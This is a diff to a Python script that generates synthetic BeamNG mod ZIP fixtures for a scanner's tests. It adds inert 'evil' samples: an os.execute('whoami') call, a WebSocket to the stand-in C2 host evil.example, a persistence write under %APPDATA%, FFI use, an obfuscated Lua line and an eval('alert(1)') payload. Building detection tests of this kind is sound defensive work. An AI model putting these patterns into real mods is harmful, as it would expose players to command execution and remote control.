@@ -1,8 +1,10 @@
-"""Generate tiny synthetic BeamNG mod ZIP fixtures for tests."""
+"""Generate tiny synthetic BeamNG mod ZIP fixtures for tests.
+
+These are authored test cases — we do not distribute real malware samples.
+"""
 
 from __future__ import annotations
 
-import io
 import zipfile
 from pathlib import Path
 
@@ -82,6 +84,8 @@ def main() -> None:
                 "angular.module('amg', [])\n"
                 ".directive('dash', function () { return {}; });\n"
             ),
+            "vehicles/car/mmi_2g_basic/mmi.js": "console.log('mmi');\n",
+            "vehicles/car/dash/board.js": "console.log('dash');\n",
             "vehicles/car/gauges_screen_MERS/gauges_screen.js": (
                 "['DatePage', 'InfoPage'].forEach((page) => {\n"
                 "  eval(page).root.n.style.display = 'inline';\n"
@@ -118,6 +122,74 @@ def main() -> None:
             "vehicles/car/ScreenGaugeAMG/evil.js": (
                 "eval(page).ok = true;\n"
                 "eval('alert(1)');\n"
+            ),
+        },
+    )
+
+    # --- Synthetic fixtures from the improvement plan ---
+    _write_zip(
+        FIX / "fp_extensions_load.zip",
+        {
+            "scripts/modScript.lua": (
+                "extensions.load('trueBeamTouch')\n"
+                "load('radarDetectorCore')\n"
+                "obj:queueGameEngineLua(\"extensions.load('parktronicge')\")\n"
+            ),
+            "vehicles/car/info.json": "{}\n",
+        },
+    )
+
+    _write_zip(
+        FIX / "evil_os_execute.zip",
+        {
+            "lua/ge/extensions/bad.lua": "os.execute('whoami')\n",
+        },
+    )
+
+    _write_zip(
+        FIX / "evil_ffi.zip",
+        {
+            "lua/ge/extensions/bad.lua": "local ffi = require('ffi')\nffi.cdef[[void exit(int);]]\n",
+        },
+    )
+
+    _write_zip(
+        FIX / "evil_websocket.zip",
+        {
+            "ui/modules/apps/spy/app.js": "const ws = new WebSocket('wss://evil.example/c2');\n",
+        },
+    )
+
+    _write_zip(
+        FIX / "evil_write_appdata.zip",
+        {
+            "lua/ge/extensions/bad.lua": (
+                'jsonWriteFile("%APPDATA%/Evil/persist.json", {ok=true})\n'
+            ),
+        },
+    )
+
+    # One dense obfuscated line with while-true + v0/v1
+    obf_body = (
+        "local v0={};local function v1(v9,v10) if (type(v9)=='string') then end "
+        "local v21=1;while true do if (v21==1) then v21=2;else break;end end end;return v0;"
+    )
+    # pad to >400 chars
+    obf_body = obf_body + (" " + "x" * 50) * 8
+    _write_zip(
+        FIX / "obfuscated_lua.zip",
+        {
+            "lua/ge/extensions/obf.lua": "-- banner\n" + obf_body + "\n",
+        },
+    )
+
+    _write_zip(
+        FIX / "html_credit_comment.zip",
+        {
+            "vehicles/car/dash/board.html": (
+                "<!DOCTYPE html>\n"
+                "<! DO NOT USE WITHOUT PERMISSION! ASK ME AT https://www.beamng.com/members/someone.1/>\n"
+                "<html><body>ok</body></html>\n"
             ),
         },
     )
